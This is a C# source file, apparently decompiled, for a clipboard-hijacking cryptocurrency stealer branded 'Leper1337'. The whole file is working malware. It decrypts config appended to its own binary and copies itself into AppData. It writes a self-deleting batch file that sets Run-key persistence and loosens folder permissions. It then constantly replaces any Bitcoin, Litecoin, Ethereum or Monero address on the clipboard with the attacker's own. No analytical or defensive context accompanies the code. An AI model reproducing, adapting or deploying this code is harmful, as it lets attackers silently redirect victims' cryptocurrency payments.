using System;
using System.Diagnostics;
using System.IO;
using System.Security.Principal;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using stub.My;

namespace stub;

[StandardModule]
internal sealed class Main
{
	private static string MasterREG = "SOFTWARE\\Leper1337";

	private static bool doinstall;

	private static string install;

	private static string REG;

	private static string BTC;

	private static string LTC;

	private static string ETH;

	private static string XMR;

	[STAThread]
	public static void Main()
	{
		try
		{
			string text = File.ReadAllText(Process.GetCurrentProcess().MainModule!.FileName);
			if (!text.Contains("|Micro _ s o ft|"))
			{
				return;
			}
			if (string.Compare(Strings.Split(text, "|Micro _ s o ft|", -1, (CompareMethod)0)[1], "True") == 0)
			{
				doinstall = true;
			}
			else
			{
				doinstall = false;
			}
			install = Decrypt_string(Strings.Split(text, "|Micro _ s o ft|", -1, (CompareMethod)0)[2], "leper1337");
			REG = Decrypt_string(Strings.Split(text, "|Micro _ s o ft|", -1, (CompareMethod)0)[3], "leper1337");
			BTC = Decrypt_string(Strings.Split(text, "|Micro _ s o ft|", -1, (CompareMethod)0)[4], "leper1337");
			LTC = Decrypt_string(Strings.Split(text, "|Micro _ s o ft|", -1, (CompareMethod)0)[5], "leper1337");
			ETH = Decrypt_string(Strings.Split(text, "|Micro _ s o ft|", -1, (CompareMethod)0)[6], "leper1337");
			XMR = Decrypt_string(Strings.Split(text, "|Micro _ s o ft|", -1, (CompareMethod)0)[7], "leper1337");
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
		if (Conversions.ToBoolean(Operators.AndObject(Operators.AndObject(Operators.CompareObjectEqual(CheckInstall(install), (object)false, false), (object)doinstall), Operators.CompareObjectEqual(CheckMasterREG(MasterREG), (object)false, false))))
		{
			try
			{
				WindowsIdentity current = WindowsIdentity.GetCurrent();
				WindowsPrincipal windowsPrincipal = new WindowsPrincipal(current);
				if (windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator))
				{
					File.Copy(Process.GetCurrentProcess().MainModule!.FileName, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + install, overwrite: true);
					string text2 = "uninstall.bat";
					File.CreateText(text2).Dispose();
					StreamWriter streamWriter = new StreamWriter(text2);
					streamWriter.WriteLine("@echo off");
					streamWriter.WriteLine("reg add HKLM\\SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\Run /V \"" + REG + "\" /t REG_SZ /d \"" + Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + install + "");
					streamWriter.WriteLine("del /f /q \"" + Process.GetCurrentProcess().MainModule!.FileName + "\"");
					streamWriter.WriteLine("icacls \"" + Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\" /grant Everyone:(OI)(CI)F /T");
					streamWriter.WriteLine("del /f /q %0");
					streamWriter.Close();
					((ServerComputer)MyProject.Computer).get_Registry().get_LocalMachine().CreateSubKey(MasterREG);
					Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + install);
					Process.Start(text2);
				}
				else
				{
					File.Copy(Process.GetCurrentProcess().MainModule!.FileName, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + install, overwrite: true);
					string text3 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "uninstall.bat";
					File.CreateText(text3).Dispose();
					StreamWriter streamWriter2 = new StreamWriter(text3);
					streamWriter2.WriteLine("@echo off");
					streamWriter2.WriteLine("del /f /q \"" + Process.GetCurrentProcess().MainModule!.FileName + "\"");
					streamWriter2.WriteLine("reg add HKCU\\SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\Run /V \"" + REG + "\" /t REG_SZ /d \"" + Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + install + "");
					streamWriter2.WriteLine("del /f /q %0");
					streamWriter2.Close();
					Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + install);
					Process.Start(text3);
				}
				return;
			}
			catch (Exception ex3)
			{
				ProjectData.SetProjectError(ex3);
				Exception ex4 = ex3;
				ProjectData.ClearProjectError();
				return;
			}
		}
		while (true)
		{
			try
			{
				if (Operators.ConditionalCompareObjectEqual(WalletType(((Computer)MyProject.Computer).get_Clipboard().GetText()), (object)1, false))
				{
					((Computer)MyProject.Computer).get_Clipboard().SetText(BTC);
					Thread.Sleep(100);
				}
				else if (Operators.ConditionalCompareObjectEqual(WalletType(((Computer)MyProject.Computer).get_Clipboard().GetText()), (object)2, false))
				{
					((Computer)MyProject.Computer).get_Clipboard().SetText(LTC);
					Thread.Sleep(100);
				}
				else if (Operators.ConditionalCompareObjectEqual(WalletType(((Computer)MyProject.Computer).get_Clipboard().GetText()), (object)3, false))
				{
					((Computer)MyProject.Computer).get_Clipboard().SetText(ETH);
					Thread.Sleep(100);
				}
				else if (Operators.ConditionalCompareObjectEqual(WalletType(((Computer)MyProject.Computer).get_Clipboard().GetText()), (object)4, false))
				{
					((Computer)MyProject.Computer).get_Clipboard().SetText(XMR);
					Thread.Sleep(100);
				}
				else
				{
					Thread.Sleep(100);
				}
			}
			catch (Exception ex5)
			{
				ProjectData.SetProjectError(ex5);
				Exception ex6 = ex5;
				ProjectData.ClearProjectError();
			}
		}
	}

	public static object CheckInstall(string install)
	{
		object result = default(object);
		try
		{
			if (File.Exists(install))
			{
				result = true;
				return result;
			}
			result = false;
			return result;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static object CheckMasterREG(string reg)
	{
		try
		{
			if (((ServerComputer)MyProject.Computer).get_Registry().get_LocalMachine().OpenSubKey(reg) == null)
			{
				return false;
			}
			return true;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			object result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static object WalletType(string clip)
	{
		try
		{
			if ((clip.Length > 25) & (clip.Length < 36) & ((Operators.CompareString(Conversions.ToString(clip[0]), "1", false) == 0) | (Operators.CompareString(Conversions.ToString(clip[0]), "3", false) == 0)) & !clip.ToString().Contains(" ") & (string.Compare(clip, BTC) != 0))
			{
				return 1;
			}
			if ((clip.Length == 34) & ((Operators.CompareString(Conversions.ToString(clip[0]), "L", false) == 0) | (Operators.CompareString(Conversions.ToString(clip[0]), "M", false) == 0)) & !clip.ToString().Contains(" ") & (string.Compare(clip, LTC) != 0))
			{
				return 2;
			}
			if ((clip.Length == 42) & ((Operators.CompareString(Conversions.ToString(clip[0]), "0", false) == 0) & (Operators.CompareString(Conversions.ToString(clip[1]), "x", false) == 0)) & !clip.ToString().Contains(" ") & (string.Compare(clip, ETH) != 0))
			{
				return 3;
			}
			if ((clip.Length == 95) & (Operators.CompareString(Conversions.ToString(clip[0]), "4", false) == 0) & !clip.ToString().Contains(" ") & (string.Compare(clip, XMR) != 0))
			{
				return 4;
			}
			return 0;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			object result = 0;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private static string Encrypt_string(string str, string key)
	{
		int num = 0;
		string text = "";
		int i = 0;
		checked
		{
			for (int length = str.Length; i < length; i++)
			{
				char c = str[i];
				num = ((num != key.Length - 1) ? (num + 1) : 0);
				text += Conversions.ToString(Strings.Chr(Strings.Asc(c) + Strings.Asc(key[num])));
			}
			return text;
		}
	}

	private static string Decrypt_string(string enc, string key)
	{
		int num = 0;
		string text = "";
		int i = 0;
		checked
		{
			for (int length = enc.Length; i < length; i++)
			{
				char c = enc[i];
				num = ((num != key.Length - 1) ? (num + 1) : 0);
				text += Conversions.ToString(Strings.Chr(Strings.Asc(c) - Strings.Asc(key[num])));
			}
			return text;
		}
	}
}
